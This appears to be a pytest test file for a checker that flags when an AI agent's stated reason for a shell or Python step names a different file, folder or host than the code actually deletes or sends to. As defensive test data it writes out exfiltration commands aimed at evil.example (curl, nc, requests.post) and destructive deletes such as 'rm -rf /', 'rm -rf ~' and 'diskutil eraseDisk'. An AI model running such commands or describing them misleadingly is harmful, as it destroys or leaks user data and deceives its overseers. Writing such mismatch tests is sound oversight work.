"""The mismatch warning compares the target, not only the kind of effect.

"Delete a temporary file" agrees with ``rm -rf build`` because both delete. The
warning now also compares what the words name (a file, a folder, a host) with
what the code deletes or sends to. It is conservative both ways: no warning
when the words name no target or the code's targets cannot be read; a warning
when none of the code's targets is what the words name, or when the code
deletes the folder that holds the one file the words name.
"""

from __future__ import annotations

from typing import Any

import pytest

from localmelo.melo.checker.review.gist import Gist, step_gist
from localmelo.melo.contracts.review import ActionReview
from localmelo.support.words import gist_text

DELETE = ActionReview("routine")
SEND = ActionReview("high", ("send_out",), ("Sends data to evil.example.",))


def gist(command: str, why: str, review: ActionReview | None = None) -> Gist:
    found = step_gist("shell_exec", {"command": command, "why": why}, review)
    assert found is not None
    return found


def script(code: str, why: str, review: ActionReview | None = None) -> Gist:
    found = step_gist("python_exec", {"code": code, "why": why}, review)
    assert found is not None
    return found


# ── Deleting: the target differs ──


def test_the_words_name_one_file_and_the_code_deletes_another_folder() -> None:
    found = gist("rm -rf build/", "Delete the temporary file notes.tmp")
    assert found.warn == "delete_target"
    assert found.warn_params == {
        "said": "Delete the temporary file notes.tmp",
        "target": "build/",
    }
    assert found.by == "code"  # the code's sentence, never the words


def test_the_warning_reads_like_the_other_one_in_english() -> None:
    found = gist("rm -rf build/", "Delete the temporary file notes.tmp")
    sentence, warning = gist_text(found.to_json(), "en")
    assert sentence == "Delete files"
    assert warning == (
        "melo described this as “Delete the temporary file notes.tmp”, "
        "but the code deletes build/."
    )


def test_the_warning_is_in_chinese_through_the_catalog() -> None:
    found = gist("rm -rf build/", "删除临时文件 notes.tmp")
    sentence, warning = gist_text(found.to_json(), "zh-Hans")
    assert found.warn == "delete_target"
    assert sentence == "删除文件"
    assert (
        warning == "melo 把这一步描述为“删除临时文件 notes.tmp”，但代码会删除 build/。"
    )


def test_chinese_words_that_name_no_target_do_not_warn() -> None:
    assert gist("rm -rf build/", "删除临时文件").warn == ""
    assert gist("rm -rf build/", "清理构建产物").warn == ""


def test_a_folder_deleted_when_the_words_name_a_single_file_inside_it() -> None:
    found = gist("rm -rf build", "Delete the temporary file build/out.o")
    assert found.warn == "delete_target"
    assert found.warn_params["target"] == "build"


def test_a_different_name_in_quotes_warns() -> None:
    found = gist("rm -rf build", "Remove the 'old' folder")
    assert found.warn == "delete_target"


def test_a_different_name_in_backticks_warns() -> None:
    assert gist("rm -rf build", "Remove the `cache` folder").warn == "delete_target"


def test_a_hidden_folder_named_in_the_words_is_a_name() -> None:
    assert gist("rm -rf build", "Remove .cache").warn == "delete_target"


def test_several_targets_are_all_named_and_cut_after_three() -> None:
    found = gist("rm -rf a b c d e", "Delete notes.tmp")
    assert found.warn == "delete_target"
    assert found.warn_params["target"] == "a, b, c, …"


def test_the_deleted_folder_a_script_names_is_compared_too() -> None:
    code = "import shutil\nshutil.rmtree('build')"
    assert script(code, "Delete notes.tmp").warn == "delete_target"
    assert script("import os\nos.remove('notes.tmp')", "Delete notes.tmp").warn == ""
    path = "from pathlib import Path\nPath('notes.tmp').unlink()"
    assert script(path, "Delete notes.tmp").warn == ""


def test_a_find_delete_is_compared_by_its_name_patterns_too() -> None:
    command = "find . -name '*.pyc' -delete"
    assert gist(command, "Remove the stale .pyc files").warn == ""
    assert gist(command, "Remove cache.log").warn == "delete_target"


def test_the_paths_a_git_discard_names_are_compared() -> None:
    review = ActionReview("high", ("delete",), ("Discards uncommitted changes.",))
    assert gist("git checkout -- a.py", "Discard changes to b.py", review).warn == (
        "delete_target"
    )
    assert gist("git checkout -- a.py", "Discard changes to a.py", review).warn == ""


# ── Deleting: nothing to compare ──


@pytest.mark.parametrize(
    "why",
    [
        "Delete a temporary file",
        "Remove the old build folder",
        "Clean up",
        "Delete what is not needed any more",
    ],
)
def test_words_that_name_no_target_do_not_warn(why: str) -> None:
    assert gist("rm -rf build", why).warn == ""


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf build/",
        "rm -rf ./build",
        "rm -rf /tmp/work/build",
        "rm -rf ~/project/build/",
        'rm -rf "build"',
    ],
)
def test_the_same_folder_by_any_spelling_matches(command: str) -> None:
    assert gist(command, "Remove the build/ folder").warn == ""


def test_a_file_named_in_a_path_matches_its_basename() -> None:
    assert gist("rm -f /tmp/x/notes.tmp", "Delete notes.tmp").warn == ""
    assert gist("rm -f notes.tmp", "Delete /tmp/x/notes.tmp").warn == ""
    assert gist("rm -f ./notes.tmp", "Delete 'notes.tmp'").warn == ""


def test_a_file_inside_the_folder_the_words_name_matches() -> None:
    assert gist("rm build/out.o", "Clean the build/ folder").warn == ""
    assert gist("rm -f build/*.o", "Clean build/").warn == ""


def test_a_glob_matches_an_equal_glob_or_the_extension_it_ends_in() -> None:
    assert gist("rm -f *.log", "Delete *.log").warn == ""
    assert gist("rm -f *.log", "Delete the .log files").warn == ""
    assert gist("rm -f *.log", "Delete notes.tmp").warn == "delete_target"


def test_a_bare_word_that_is_the_target_matches() -> None:
    assert gist("rm -rf build", "Delete notes.tmp and the build folder").warn == ""
    assert gist("rm -rf build dist", "Delete the build/ and dist folders").warn == ""


def test_a_target_melo_cannot_read_is_not_compared() -> None:
    assert gist('rm -rf "$DIR"', "Delete notes.tmp").warn == ""
    assert gist("rm -rf $(mktemp -d)", "Delete notes.tmp").warn == ""
    assert gist('rm -rf "$DIR"/*', "Delete notes.tmp").warn == ""
    code = "import shutil\nshutil.rmtree(path)"
    assert script(code, "Delete notes.tmp").warn == ""


def test_a_variable_in_the_parent_still_leaves_the_name() -> None:
    assert gist('rm -rf "$TMPDIR/build"', "Delete notes.tmp").warn == "delete_target"
    assert gist('rm -rf "$TMPDIR/build"', "Delete the build/ folder").warn == ""


def test_a_version_number_or_an_abbreviation_is_not_a_name() -> None:
    assert gist("rm -rf build", "Delete the old files, e.g. caches (v1.2)").warn == ""


def test_the_effect_warning_comes_first_when_the_words_do_not_say_delete() -> None:
    found = gist("rm -rf build", "List notes.tmp")
    assert found.warn == "delete"


# ── Sending: the host differs ──


def test_the_words_name_a_host_and_the_code_sends_to_another() -> None:
    found = gist(
        "curl -T report.pdf https://evil.example/up",
        "Upload the report to example.com",
        SEND,
    )
    assert found.warn == "send_out_target"
    assert found.warn_params["target"] == "evil.example"
    sentence, warning = gist_text(found.to_json(), "en")
    assert warning == (
        "melo described this as “Upload the report to example.com”, "
        "but the code sends data to evil.example."
    )


def test_the_send_warning_is_in_chinese_through_the_catalog() -> None:
    found = gist(
        "curl -T report.pdf https://evil.example/up", "把报告上传到 example.com", SEND
    )
    _, warning = gist_text(found.to_json(), "zh-Hans")
    assert found.warn == "send_out_target"
    assert warning == (
        "melo 把这一步描述为“把报告上传到 example.com”，但代码会向 evil.example 发送数据。"
    )


@pytest.mark.parametrize(
    ("command", "why"),
    [
        ("curl -T r.pdf https://example.com/up", "Upload the report to example.com"),
        (
            "curl -T r.pdf https://api.example.com/up",
            "Upload the report to example.com",
        ),
        ("curl -T r.pdf https://example.com/up", "Upload to https://api.example.com/x"),
        ("curl -T r.pdf https://example.com:8443/up", "Upload to example.com"),
        ("scp r.pdf alex@files.example.com:/srv", "Upload r.pdf to files.example.com"),
        ("rsync -a out/ alex@example.com:/srv", "Back up out/ to example.com"),
    ],
)
def test_the_host_the_words_name_matches_the_hosts_in_the_code(
    command: str, why: str
) -> None:
    assert gist(command, why).warn == ""


@pytest.mark.parametrize(
    "why",
    [
        "Upload the report",
        "Send the file to the server",
        "Upload report.pdf",  # a file name is not a host
        "Back up notes.md",
    ],
)
def test_words_that_name_no_host_do_not_warn(why: str) -> None:
    assert gist("curl -T report.pdf https://evil.example/up", why).warn == ""


def test_a_file_name_that_ends_like_a_domain_is_a_file_not_a_host() -> None:
    assert gist("curl -T a.sh https://evil.example/up", "Upload a.sh").warn == ""
    assert gist("curl -T a.py https://evil.example/up", "Upload run.py").warn == ""


def test_a_host_built_at_run_time_is_not_compared() -> None:
    assert gist('curl -T r.pdf "https://$HOST/up"', "Upload to example.com").warn == ""


def test_a_python_post_names_its_host() -> None:
    code = "import requests\nrequests.post('https://evil.example/x', data=b'1')"
    review = ActionReview("high", ("send_out",), ("Sends data.",))
    assert script(code, "Send it to example.com", review).warn == "send_out_target"
    assert script(code, "Send it to evil.example", review).warn == ""


def test_other_senders_name_their_host() -> None:
    assert gist("nc evil.example 4444 < r.pdf", "Send to example.com").warn == (
        "send_out_target"
    )
    assert gist(
        "mail -s hi alex@evil.example < r.txt", "Mail alex@example.com"
    ).warn == ("send_out_target")
    assert (
        gist("mail -s hi alex@example.com < r.txt", "Mail alex@example.com").warn == ""
    )


def test_a_cloud_bucket_is_named_by_its_bucket() -> None:
    command = "aws s3 cp r.pdf s3://backup-bucket/r.pdf"
    assert gist(command, "Upload to s3://backup-bucket/").warn == ""
    assert gist(command, "Upload to files.example.com").warn == "send_out_target"


def test_a_name_without_a_dot_is_not_a_part_of_a_domain() -> None:
    """A bucket or remote called like a label of the named domain is not that domain."""
    command = "aws s3 cp r.pdf s3://example/r.pdf"
    assert gist(command, "Upload to backup.example.com").warn == "send_out_target"
    assert gist("rclone copy r.pdf com:", "Upload to files.example.com").warn == (
        "send_out_target"
    )


# ── The kinds never mix ──


def test_the_target_check_only_runs_when_the_words_agree_on_the_effect() -> None:
    """Words that do not say delete or send at all get the plain warning."""
    assert gist("rm -rf build", "Show the log notes.txt").warn == "delete"


def test_the_target_check_compares_the_right_kind_of_target() -> None:
    """A deleted path is compared with files and folders, a send with hosts."""
    found = gist("curl -T r.pdf https://evil.example/up", "Delete notes.tmp")
    assert found.warn == "send_out"  # the plain effect warning: the words say delete


def test_the_words_never_replace_the_sentence_when_they_warn() -> None:
    found = gist("rm -rf build", "Delete notes.tmp")
    assert found.id == "effect_delete"
    assert found.by == "code"


def test_no_warning_without_words() -> None:
    found: Any = step_gist("shell_exec", {"command": "rm -rf build"})
    assert found.warn == ""


# ── Git commands that discard work ──


@pytest.mark.parametrize(
    "why",
    [
        "Revert my local changes",
        "Restore the file from the last commit",
        "Reset the working tree",
        "Undo the edits",
        "Throw away the experiment",
        "还原本地修改",
    ],
)
def test_an_honest_description_of_a_git_discard_does_not_warn(why: str) -> None:
    review = ActionReview("high", ("delete",), ("Discards uncommitted changes.",))
    assert gist("git checkout -- .", why, review).warn == ""
    assert gist("git restore .", why, review).warn == ""


def test_a_git_discard_described_as_a_look_is_still_a_mismatch() -> None:
    review = ActionReview("high", ("delete",), ("Discards uncommitted changes.",))
    assert gist("git checkout -- .", "Show the status", review).warn == "delete"


def test_the_git_words_do_not_cover_a_delete_by_rm() -> None:
    assert gist("rm -rf build", "Reset the repository").warn == "delete"
    assert (
        gist("git checkout -- . && rm -rf build", "Revert my local changes").warn
        == "delete"
    )


@pytest.mark.parametrize(
    ("command", "why"),
    [
        ("git clean -fdx", "Restore the repo to how it was"),
        ("git clean -fdx", "Undo my changes"),
        ("git clean -fd", "Clear the untracked files"),
        ("git clean -fd", "Check out the main branch"),
        ("git clean -fdx", "Stash my work"),
        ("git clean -f", "Reject the generated output"),
        ("git reset --hard", "Undo the last edit"),
        ("git reset --hard origin/main", "Check out origin/main"),
        ("git clean -fdx && git checkout -- .", "Revert my local changes"),
        ("git checkout -- . && rm -rf build", "Revert my local changes"),
        ("git clean -fd -enode_modules", "List the untracked files"),
        ("git clean -fd -e.env", "List the untracked files"),
        ("git clean -nd", "List the untracked files"),
    ],
)
def test_git_clean_and_reset_hard_keep_the_base_delete_warning(
    command: str, why: str
) -> None:
    """The honest-words exception is only for commands that were not a delete before."""
    review = ActionReview("high", ("delete",), ("Discards uncommitted changes.",))
    assert gist(command, why, review).warn == "delete"


def test_the_git_words_do_not_cover_a_discard_beside_another_command() -> None:
    review = ActionReview("high", ("delete",), ("Discards uncommitted changes.",))
    assert gist(
        "git checkout -- . && ./cleanup.sh", "Revert my changes", review
    ).warn == ("delete")
    harmless = "cd sub && git status && git checkout -- ."
    assert gist(harmless, "Revert my changes", review).warn == ""


def test_the_git_words_do_not_cover_a_delete_the_rules_found_elsewhere() -> None:
    """A category the code does not show is a reason to keep the plain warning."""
    review = ActionReview("high", ("delete", "system"), ("Does more.",))
    assert gist("git checkout -- .", "Revert my changes", review).warn == "delete"


@pytest.mark.parametrize(
    "why",
    ["Revert my local changes", "Restore the files", "Undo the edits", "还原本地修改"],
)
def test_an_honest_description_of_a_git_discard_still_does_not_warn(why: str) -> None:
    review = ActionReview("high", ("delete",), ("Discards uncommitted changes.",))
    assert gist("git checkout -- .", why, review).warn == ""
    assert gist("git restore --worktree .", why, review).warn == ""
    assert gist("git stash drop", why, review).warn == ""


# ── Every target the code acts on has to be named ──


def test_every_deleted_target_must_be_named() -> None:
    found = gist("rm -rf src build", "Delete build/")
    assert found.warn == "delete_target"
    assert found.warn_params["target"] == "src"
    code = "import os, shutil\nos.remove('notes.md')\nshutil.rmtree('src')"
    other = script(code, "Delete notes.md")
    assert other.warn == "delete_target"
    assert other.warn_params["target"] == "src"


def test_only_the_targets_that_are_not_named_are_listed() -> None:
    found = gist("rm -rf a b c d e", "Delete the 'c' folder and a.tmp")
    assert found.warn == "delete_target"
    assert found.warn_params["target"] == "a, b, d, …"
    found = gist("rm -rf a b c d e", "Delete b and the 'c' folder, a.tmp")
    assert found.warn_params["target"] == "a, d, e"  # the bare b is spelt out


def test_every_target_named_means_no_warning() -> None:
    assert gist("rm -rf build dist", "Delete build/ and dist/").warn == ""
    assert gist("rm -f a.tmp b.tmp", "Delete a.tmp and b.tmp").warn == ""


def test_every_host_sent_to_has_to_be_named() -> None:
    command = "curl -T r.pdf https://example.com/up https://evil.example/up"
    found = gist(command, "Upload r.pdf to example.com")
    assert found.warn == "send_out_target"
    assert found.warn_params["target"] == "evil.example"


@pytest.mark.parametrize(
    ("command", "why"),
    [
        ("rm -rf ~/Documents", "Delete old.txt in Documents"),
        ("rm -rf src", "Delete the old.tmp file in the src tree"),
        ("rm -rf src", "Delete old.tmp from the src folder"),
        ("rm -rf src", "删除 src里的old.tmp"),
        ("rm -rf build", "Delete out.o inside build"),
    ],
)
def test_a_file_in_a_bare_folder_name_still_warns_when_the_folder_goes(
    command: str, why: str
) -> None:
    assert gist(command, why).warn == "delete_target"


@pytest.mark.parametrize(
    ("command", "why"),
    [
        ("rm -rf build", "Delete notes.tmp and the build folder"),
        ("rm -rf build dist", "Delete build/ and the dist folder"),
        ("rm -rf src", "Delete notes.tmp, then src"),
        ("rm -rf 缓存", "删除 notes.tmp 和 缓存"),
    ],
)
def test_a_bare_word_that_is_the_thing_deleted_still_matches(
    command: str, why: str
) -> None:
    assert gist(command, why).warn == ""


@pytest.mark.parametrize(
    ("command", "why"),
    [
        ("rm -rf src/*", "Delete src/a.py"),
        ("rm -rf ~/projects/*", "Delete projects/app/build/tmp.log"),
        ("rm -f *.*", "Delete notes.md"),
        ("rm -f [!.]*", "Delete notes.md"),
        ("rm -f *.log", "Delete debug.log"),
        ("rm -rf build/*", "Delete build/tmp.log"),
    ],
)
def test_a_glob_target_warns_against_one_named_file(command: str, why: str) -> None:
    assert gist(command, why).warn == "delete_target"


@pytest.mark.parametrize(
    ("command", "why"),
    [
        ("rm -rf src/*", "Delete everything in src/"),
        ("rm -rf src/*", "Delete src/*"),
        ("rm -f build/*.o", "Clean the build/ folder"),
        ("rm -f *.log", "Delete the .log files"),
        ("rm -f debug.log", "Delete '*.log'"),
    ],
)
def test_a_glob_target_matches_the_folder_it_lists_or_an_equal_glob(
    command: str, why: str
) -> None:
    assert gist(command, why).warn == ""


@pytest.mark.parametrize(
    "command",
    ["rm -rf ./*", "rm -rf ~", "rm -rf /", "rm -rf ..", "rm -rf build/..", "rm -rf ."],
)
def test_a_broad_target_warns_against_a_named_file(command: str) -> None:
    found = gist(command, "Delete build/tmp.log")
    assert found.warn == "delete_target"
    assert found.warn_params["target"] == command.removeprefix("rm -rf ")


def test_a_broad_target_after_cd_is_not_compared() -> None:
    assert gist("cd build && rm -rf *", "Delete build/tmp.log").warn == ""
    assert gist("cd build && rm -rf .", "Delete build/tmp.log").warn == ""


def test_a_target_built_at_run_time_is_still_not_compared() -> None:
    assert gist('rm -rf "$DIR"', "Delete notes.tmp").warn == ""
    assert gist('rm -rf "$DIR"/*', "Delete notes.tmp").warn == ""
    assert gist("rm -rf $(mktemp -d)", "Delete notes.tmp").warn == ""


def test_a_full_width_spelling_names_the_same_thing() -> None:
    assert gist("rm -rf build", "Delete ｎｏｔｅｓ．ｔｍｐ").warn == "delete_target"
    assert gist("rm -rf notes.tmp", "Delete ｎｏｔｅｓ．ｔｍｐ").warn == ""


def test_a_scheme_name_is_not_run_together_with_what_follows() -> None:
    """A long run of letters before ``://`` is read in one pass."""
    assert gist("rm -rf build", "Delete " + "a" * 5000 + "://").warn in ("", "delete")


def test_a_disk_erase_is_compared_by_the_disk_it_names() -> None:
    found = gist("diskutil eraseDisk APFS Backup disk2", "Erase the build/ folder")
    assert found.warn == "delete_target"
    assert found.warn_params["target"] == "disk2"
    assert gist("diskutil eraseDisk APFS Backup disk2", "Erase disk2").warn == ""


def test_stashing_is_not_dropping_a_stash() -> None:
    review = ActionReview("high", ("delete",), ("Deletes stashed work.",))
    assert gist("git stash drop", "Stash my work for later", review).warn == "delete"
    assert gist("git stash drop", "Drop the old stash", review).warn == ""
